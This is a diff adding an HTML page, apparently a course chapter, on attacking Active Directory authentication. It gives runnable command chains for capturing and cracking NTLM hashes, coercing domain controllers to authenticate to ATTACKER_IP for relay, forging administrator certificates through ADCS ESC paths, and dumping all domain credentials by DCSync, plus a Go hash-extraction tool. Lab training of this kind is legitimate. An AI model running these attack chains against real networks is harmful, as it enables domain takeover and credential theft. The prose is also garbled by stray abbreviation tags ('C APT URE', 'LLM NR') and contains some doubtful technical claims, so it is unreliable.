+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="capturing-and-cracking-net-ntlm-hashes">Capturing and Cracking Net-NTLM Hashes</h3>
+						<p>
+							Net-
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							v2 hashes are crackable offline. The format includes the server
+							challenge and the client response.
+						</p>
+						<pre class="plaintext">
+Net-NTLMv2 hash format:
+username::domain:server_challenge:nt_response:client_challenge
+OR:
+username::domain:server_challenge:HMAC_MD5_part:NTProofStr_rest
+
+Responder output format:
+jsmith::corp:1122334455667788:AB12CD34...:EF56GH78...
+
+Hashcat mode 5600 = NetNTLMv2
+						</pre>
+						<pre class="bash">
+# Capture Net-NTLMv2 with Responder
+sudo responder -I eth0 -v
+# Hashes are saved to /usr/share/responder/logs/SMB-NTLMv2-*.txt
+
+# Crack with hashcat
+hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.0.0.txt \
+    /usr/share/wordlists/rockyou.txt --force
+
+# -m 5600 = NetNTLMv2
+# -m 5500 = NetNTLMv1 (hashcat or John; NTLMv1 is trivially crackable)
+						</pre>
+					</section>
+					<section>
+						<h3 id="authentication-coercion">Authentication Coercion</h3>
+						<p>
+							Coercion techniques force a privileged machine (often a Domain Controller) to initiate an
+							<abbr title="Server Message Block">SMB</abbr>
+							or
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							connection to your attacker machine. This triggers
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							authentication, which you then relay or capture.
+						</p>
+						<h4 id="petitpotam">PetitPotam</h4>
+						<p>
+							PetitPotam exploits the EFS
+							<abbr title="Remote Procedure Call">RPC</abbr>
+							interface on Windows. The
+							<code>EfsRpcOpenFileRaw</code>
+							function accepts a UNC path and causes the target to authenticate to that path over
+							<abbr title="Server Message Block">SMB</abbr>
+							.
+						</p>
+						<pre class="bash">
+# PetitPotam coercion - force a DC to authenticate to your relay server
+python3 PetitPotam.py -u jsmith -p password -d corp.local \
+    ATTACKER_IP dc01.corp.local
+
+# Or without credentials (some older/unpatched servers):
+python3 PetitPotam.py ATTACKER_IP dc01.corp.local
+
+# The DC&#39;s machine account (DC01$) authenticates to ATTACKER_IP over SMB.
+# ntlmrelayx captures or relays this authentication.
+						</pre>
+						<pre class="bash">
+# Combined PetitPotam + NTLM relay attack chain:
+# Terminal 1 - ntlmrelayx relay to LDAPS on the DC
+ntlmrelayx.py -t ldaps://10.0.0.1 --add-computer EVIL-MACHINE -smb2support
+
+# Terminal 2 - trigger authentication with PetitPotam
+python3 PetitPotam.py ATTACKER_IP 10.0.0.1
+# The DC authenticates to us. We relay to LDAPS on the DC.
+# We add a computer account EVIL-MACHINE$.
+# Now EVIL-MACHINE$ exists -&gt; RBCD attack path is open.
+						</pre>
+						<h4 id="printerbug">PrinterBug</h4>
+						<p>
+							The
+							<code>RpcRemoteFindFirstPrinterChangeNotification</code>
+							function over MS-RPRN forces the print spooler
+							service to authenticate to an arbitrary host.
+						</p>
+						<pre class="bash">
+# PrinterBug coercion
+python3 printerbug.py corp.local/jsmith:password@dc01.corp.local ATTACKER_IP
+
+# Combined with relay: same pattern as PetitPotam
+# Terminal 1: ntlmrelayx.py -t ldaps://10.0.0.1 --delegate-access
+# Terminal 2: printerbug.py corp.local/user:pass@dc01.corp.local ATTACKER_IP
+						</pre>
+						<h4 id="dfscoerce">DFSCoerce</h4>
+						<p>
+							DFSCoerce exploits the NetrDfsRemoveStdRoot or NetrDfsAddStdRoot methods over MS-DFSNM to force
+							authentication.
+						</p>
+						<pre class="bash">
+# DFSCoerce coercion
+python3 dfscoerce.py -d corp.local -u jsmith -p password dc01.corp.local ATTACKER_IP
+						</pre>
+						<h4 id="shadowcoerce">ShadowCoerce</h4>
+						<pre class="bash">
+python3 shadowcoerce.py -d corp.local -u jsmith -p password dc01.corp.local ATTACKER_IP
+						</pre>
+					</section>
+					<section>
+						<h3 id="adcs-attacks">ADCS Attacks</h3>
+						<p>
+							A
+							<abbr title="Domain Controller">DC</abbr>
+							S issues X.509 certificates for
+							<abbr title="Transport Layer Security">TLS</abbr>
+							,
+							code signing, smart card logon, and Kerberos
+							<abbr title="Public Key Infrastructure">PKI</abbr>
+							NIT authentication.
+							When misconfigured, A
+							<abbr title="Domain Controller">DC</abbr>
+							S becomes the most reliable path to Domain Admin
+							through certificate enrollment abuse.
+						</p>
+						<p>
+							<b>Core concept</b>
+							: If you can request a certificate with an arbitrary Subject Alternative Name
+							(SAN) for a high-value target (Domain Admin), you can use that certificate to authenticate as
+							that user via Kerberos
+							<abbr title="Public Key Infrastructure">PKI</abbr>
+							NIT or Schannel.
+						</p>
+						<h4 id="esc1">ESC1</h4>
+						<p>
+							ESC1 occurs when an Enterprise
+							<abbr title="Certificate Authority">CA</abbr>
+							has the "Web Enrollment" role installed
+							AND a certificate template allows the enrollee to supply a Subject Alternative Name (SAN) AND
+							the template is configured for client authentication.
+						</p>
+						<pre class="bash">
+# certipy - the primary tool for ADCS exploitation
+pip install certipy-ad
+
+# Step 1 - Enumerate ADCS infrastructure
+certipy find -u jsmith@corp.local -p password -dc-ip 10.0.0.1 -ns 10.0.0.1
+# Outputs certificates.zip with JSON/HTML/text reports of the ADCS configuration.
+# Look for ESC1-ESC13 vulnerabilities in the text report.
+
+# Step 2 - Identify an ESC1-vulnerable template
+# certipy&#39;s output marks vulnerable templates with &#34;ESC1&#34; flag.
+# Required conditions for ESC1:
+#   1. ENROLLEE_SUPPLIES_SUBJECT flag is set in mspki-certificate-name-flag
+#   2. The template has Client Authentication EKU (1.3.6.1.5.5.7.3.2)
+#   3. Enrollment permissions granted to Domain Users or a group you belong to
+
+# Step 3 - Request a certificate as a Domain Admin (ESC1)
+certipy req -u jsmith@corp.local -p password -dc-ip 10.0.0.1 -ns 10.0.0.1 \
+    -ca CORP-CA -template VulnerableTemplate \
+    -upn administrator@corp.local
+# -upn : specifies the User Principal Name in the certificate&#39;s SAN.
+#        The CA honors it because ENROLLEE_SUPPLIES_SUBJECT is enabled.
+
+# Step 4 - Authenticate with the certificate
+certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
+# Performs Kerberos PKINIT - obtains a TGT by presenting the certificate.
+# Output: administrator.ccache (TGT for the Administrator user)
+
+# Step 5 - Use the TGT
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass dc01.corp.local
+						</pre>
+						<h4 id="esc1-via-ntlm-relay">ESC1 via NTLM Relay</h4>
+						<pre class="bash">
+# If you cannot authenticate to ADCS directly, relay a coerced authentication
+# from a Domain Controller or Domain Admin to the ADCS HTTP endpoint.
+
+# Terminal 1 - ntlmrelayx relaying to ADCS
+ntlmrelayx.py -t http://10.0.0.1/certsrv/certfnsh.asp --adcs \
+    --template DomainController
+
+# Terminal 2 - Coerce authentication from a DC
+python3 PetitPotam.py ATTACKER_IP 10.0.0.1
+
+# When ESC1 conditions are met, ntlmrelayx requests a certificate as the
+# relayed principal (e.g., DC01$), which can be used for PKINIT.
+						</pre>
+						<h4 id="esc2-esc13-quick-reference">ESC2-ESC13 Quick Reference</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">ESC Path</th>
+									<th align="center">Condition</th>
+									<th align="center">Impact</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><b>ESC1</b></td>
+									<td align="center">Template allows SAN specification + Client Auth EKU</td>
+									<td align="center">Certificate for any user</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC2</b></td>
+									<td align="center">Template allows SAN specification + Any Purpose EKU (2.5.29.37.0)</td>
+									<td align="center">Certificate for any user, wider scope</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC3</b></td>
+									<td align="center">Enrollment Agent template + another template</td>
+									<td align="center">Request certificate on behalf of any user</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC4</b></td>
+									<td align="center">Write permissions on a template (modify msPKI-*)</td>
+									<td align="center">Modify template to be ESC1-vulnerable</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC5</b></td>
+									<td align="center">Control over the CA server or PKI objects</td>
+									<td align="center">Full CA compromise</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC6</b></td>
+									<td align="center">CA flag: EDITF_ATTRIBUTESUBJECTALTNAME2</td>
+									<td align="center">SAN can be supplied regardless of template settings</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC7</b></td>
+									<td align="center">Manage CA role (approve pending requests)</td>
+									<td align="center">Approve a malicious certificate request</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC8</b></td>
+									<td align="center">HTTP web enrollment without EPA (Extended Protection)</td>
+									<td align="center">NTLM relay to HTTP enrollment endpoint</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC9</b></td>
+									<td align="center">No security extension (CT_FLAG_NO_SECURITY_EXTENSION)</td>
+									<td align="center">Bypass certificate mapping checks</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC10</b></td>
+									<td align="center">Weak certificate mappings (User Principal Name)</td>
+									<td align="center">Impersonate a user with an alternate UPN</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC11</b></td>
+									<td align="center">NTLM relay to ICPR (ICertPassage RPC)</td>
+									<td align="center">Relay enrollment to a CA over RPC</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC12</b></td>
+									<td align="center">Shell access to CA server + CA certificate</td>
+									<td align="center">Offline CA certificate theft</td>
+								</tr>
+								<tr>
+									<td align="center"><b>ESC13</b></td>
+									<td align="center">OID group linking via issuance policy</td>
+									<td align="center">Certificate-based group membership</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# ESC4 - Modify a template (requires WriteOwner or GenericAll on the template)
+certipy template -u jsmith@corp.local -p password -dc-ip 10.0.0.1 \
+    -template VulnerableTemplate -save-old
+# Modifies the template to be ESC1-vulnerable, then revert with -restore.
+
+# ESC6 - Abuse EDITF_ATTRIBUTESUBJECTALTNAME2
+certipy req -u jsmith@corp.local -p password -dc-ip 10.0.0.1 \
+    -ca CORP-CA -template User -upn administrator@corp.local
+
+# ESC7 - Manage CA (approve a pending request)
+certipy ca -u jsmith@corp.local -p password -dc-ip 10.0.0.1 \
+    -ca CORP-CA -issue-request &lt;request_id&gt;
+
+# ESC8 - NTLM relay to ADCS HTTP (same as ESC1 relay above)
+
+# Shadow Credentials (a separate technique, not an ESC): add a Key Credential
+# to a target account so it can be authenticated with a certificate.
+certipy shadow auto -u jsmith@corp.local -p password \
+    -account target_user -dc-ip 10.0.0.1
+						</pre>
+					</section>
+					<section>
+						<h3 id="dcsync">DCSync</h3>
+						<p>
+							<abbr title="Domain Controller">DC</abbr>
+							Sync impersonates a Domain Controller and requests replication of domain
+							credentials via the MS-DRSR (Directory Replication Service Remote) protocol. The attacking machine
+							sends
+							<code>DsGetNCChanges</code>
+							to a real
+							<abbr title="Domain Controller">DC</abbr>
+							, which responds with the requested
+							objects' attributes - including password hashes.
+						</p>
+						<p>
+							<b>Required privilege</b>
+							:
+							<code>DS-Replication-Get-Changes</code>
+							and
+							<code>DS-Replication-Get-Changes-All</code>
+							extended
+							rights on the domain root object. By default, these rights are granted to Domain Admins, Enterprise
+							Admins, Administrators, and Domain Controllers. Any other group or user with these rights delegated
+							can also
+							<abbr title="Domain Controller">DC</abbr>
+							Sync.
+						</p>
+						<pre class="bash">
+# DCSync - dump all domain credentials
+secretsdump.py -just-dc corp.local/user_with_dcsync_rights:password@dc01.corp.local
+
+# DCSync - dump only specific accounts (quieter)
+secretsdump.py -just-dc-user krbtgt corp.local/user_with_dcsync_rights:password@dc01.corp.local
+secretsdump.py -just-dc-user administrator corp.local/user_with_dcsync_rights:password@dc01.corp.local
+
+# DCSync using NT hash instead of password
+secretsdump.py -just-dc -hashes :ntlm_hash corp.local/user@dc01.corp.local
+
+# DCSync using Kerberos ticket
+secretsdump.py -k -no-pass dc01.corp.local
+						</pre>
+						<pre class="bash">
+# Enumerate accounts with DCSync rights via BloodHound:
+# MATCH (u:User)-[r:GetChanges|GetChangesAll]-&gt;(d:Domain)
+# RETURN u.name, type(r)
+
+# Or find groups with DCSync via ldapsearch:
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(&amp;(objectclass=group)(|(ntSecurityDescriptor=*DS-Replication-Get-Changes*)(ntSecurityDescriptor=*DS-Replication-Get-Changes-All*)))&#34; \
+    cn samaccountname 2&gt;/dev/null
+						</pre>
+						<pre class="bash">
+# Granting DCSync rights (requires Domain Admin or ACL Write on the domain root)
+# Using Powerview on a Windows host:
+# Add-DomainObjectAcl -TargetIdentity &#34;DC=corp,DC=local&#34; \
+#     -PrincipalIdentity jsmith \
+#     -Rights DCSync
+
+# Using Impacket&#39;s dacledit.py (alternative)
+dacledit.py -action write -principal jsmith -target-dn &#39;DC=corp,DC=local&#39; \
+    -dc-ip 10.0.0.1 corp.local/administrator:password \
+    -rights DCSync
+# Then DCSync as jsmith.
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<p>
+							<b>Pass-the-Hash with an empty LM hash incorrectly formatted.</b>
+							The correct format is
+							<code>:NTHASH</code>
+							(colon before the hash). Formatting the hash without the leading colon (
+							<code>NTHASH</code>
+							) causes the
+							impacket tools to interpret it as the NT part of a malformed hash and fail. Always include the
+							leading colon.
+						</p>
+						<p>
+							<b>NTLM relay - using default Responder config.</b>
+							Responder's default configuration runs its
+							own
+							<abbr title="Server Message Block">SMB</abbr>
+							and
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							servers, which C
+							<abbr title="Advanced Persistent Threat">APT</abbr>
+							URE the credential rather than letting ntlmrelayx relay it. Disable
+							<abbr title="Server Message Block">SMB</abbr>
+							and
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							in
+							<code>/etc/responder/Responder.conf</code>
+							before launching
+							a relay attack, or use
+							<code>--lm</code>
+							in ntlmrelayx to ignore Responder's own hashes.
+						</p>
+						<p>
+							<b>Relay target selection - relaying to a DC over SMB with SMB signing enforced.</b>
+							Since Windows
+							Server 2019,
+							<abbr title="Server Message Block">SMB</abbr>
+							signing is required on all
+							<abbr title="Domain Controller">DC</abbr>
+							s. Relay to
+							<abbr title="Server Message Block">SMB</abbr>
+							on a
+							<abbr title="Domain Controller">DC</abbr>
+							will fail. Use
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							S (port 636) or
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							/A
+							<abbr title="Domain Controller">DC</abbr>
+							S as the relay
+							target instead.
+						</p>
+						<p>
+							<b>DCSync - using an account that has DCSync rights but attempting to replicate a DC.</b>
+							
+							<abbr title="Domain Controller">DC</abbr>
+							Sync works against any writable
+							<abbr title="Domain Controller">DC</abbr>
+							, not read-only
+							<abbr title="Domain Controller">DC</abbr>
+							s (RO
+							<abbr title="Domain Controller">DC</abbr>
+							). If the only available
+							<abbr title="Domain Controller">DC</abbr>
+							is an RO
+							<abbr title="Domain Controller">DC</abbr>
+							,
+							<abbr title="Domain Controller">DC</abbr>
+							Sync will fail. Verify the
+							<abbr title="Domain Controller">DC</abbr>
+							type with
+							<code>nltest /dsgetdc:corp.local</code>
+							or check the
+							<code>isGlobalCatalogReady</code>
+							RootDSE attribute.
+						</p>
+						<p>
+							<b>ADCS ESC1 - certificate not usable for Kerberos PKINIT.</b>
+							The certificate must have the Smart
+							Card Logon EKU (1.3.6.1.4.1.311.20.2.2) or Client Authentication EKU (1.3.6.1.5.5.7.3.2). A
+							certificate with only the Server Authentication EKU (1.3.6.1.5.5.7.3.1) cannot be used for
+							<abbr title="Public Key Infrastructure">PKI</abbr>
+							NIT. Verify with:
+						</p>
+						<pre class="bash">
+certipy auth -pfx certificate.pfx -dc-ip 10.0.0.1
+# If it fails: the certificate lacks the required EKU.
+						</pre>
+						<p>
+							<b>Responder running on the wrong interface.</b>
+							Responder defaults to
+							<code>-I eth0</code>
+							. If your attacker
+							machine uses a different interface (e.g.,
+							<code>tun0</code>
+							for
+							<abbr title="Virtual Private Network">VPN</abbr>
+							,
+							<code>wlan0</code>
+							for WiFi), specify it explicitly with
+							<code>-I</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write a Go tool that parses a
+							<code>secretsdump.py</code>
+							output file and extracts every usable NT hash.
+							Each line has the form
+							<code>username:RID:LM:NT:::</code>
+							. Skip lines whose NT field is not 32 hex characters,
+							write
+							<code>username:NT</code>
+							lines to stdout for hashcat, and report any NT hash that is shared by more
+							than one account, which reveals password reuse.
+						</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;bufio&#34;
+	&#34;fmt&#34;
+	&#34;os&#34;
+	&#34;strings&#34;
+)
+
+func main() {
+	file, err := os.Open(os.Args[1])
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	defer file.Close()
+
+	seen := map[string][]string{}
+	scanner := bufio.NewScanner(file)
+
+	for scanner.Scan() {
+		fields := strings.Split(scanner.Text(), &#34;:&#34;)
+		if len(fields) &lt; 4 {
+			continue
+		}
+		user, nt := fields[0], fields[3]
+		if len(nt) != 32 {
+			continue
+		}
+		fmt.Printf(&#34;%s:%s\n&#34;, user, nt)
+		seen[nt] = append(seen[nt], user)
+	}
+
+	fmt.Fprintln(os.Stderr, &#34;Reused NT hashes:&#34;)
+	for hash, users := range seen {
+		if len(users) &gt; 1 {
+			fmt.Fprintf(os.Stderr, &#34;  %s... shared by %s\n&#34;, hash[:8], strings.Join(users, &#34;, &#34;))
+		}
+	}
+}
+						</pre>
+						<p>
+							Build it, run it against a dump, and crack the resulting list with
+							<code>hashcat -m 1000</code>
+							. Hashcat
+							accepts the
+							<code>username:hash</code>
+							form.
+						</p>
+						<p>
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							attacks cannot be practiced in a lightweight container: they need a full
+							Active Directory domain. Minimum lab:
+						</p>
+						<ul>
+							<li>1 Windows Server 2022 Domain Controller with <abbr title="Active Directory Certificate Services">ADCS</abbr> installed for ESC practice</li>
+							<li>1 Windows 10/11 workstation</li>
+							<li>1 Linux attacker <abbr title="Virtual Machine">VM</abbr> on the same network segment</li>
+							<li><code>LLMNR</code> and NBT-NS enabled on the workstations (default in Windows)</li>
+							<li><abbr title="Server Message Block">SMB</abbr> signing not required on the workstation (default)</li>
+							<li>Web Enrollment role installed on the <abbr title="Active Directory Certificate Services">ADCS</abbr> server (for ESC1 and ESC8)</li>
+						</ul>
+						<p>
+							Use
+							<a class="icon-github" href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">GOAD</a>
+							for automated provisioning. It includes
+							certificate templates configured for the ESC1, ES
+							<abbr title="Command and Control">C2</abbr>
+							, ESC3, ESC4, ESC7,
+							and ESC8 vectors.
+						</p>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/" target="_blank">MS-NLMP - NT LAN Manager (NTLM) Authentication Protocol</a> - the protocol specification</li>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsrpc/" target="_blank">MS-EFSRPC - Encrypting File System Remote Protocol</a> - the interface PetitPotam abuses</li>
+							<li><a class="icon-github" href="https://github.com/ly4k/Certipy" target="_blank">Certipy</a> - A <abbr title="Domain Controller">DC</abbr> S enumeration and exploitation</li>
+							<li><a class="icon-github" href="https://github.com/lgandx/Responder" target="_blank">Responder</a> - <abbr title="Large Language Model">LLM</abbr> NR, NBT-NS, and m <abbr title="Domain Name System">DNS</abbr> poisoning</li>
+							<li><a class="icon-github" href="https://github.com/fortra/impacket" target="_blank">Impacket</a> - secretsdump, ntlmrelayx, and the coercion clients</li>
+							<li><a class="icon-github" href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">GOAD - Game of Active Directory</a> - automated Active Directory lab</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
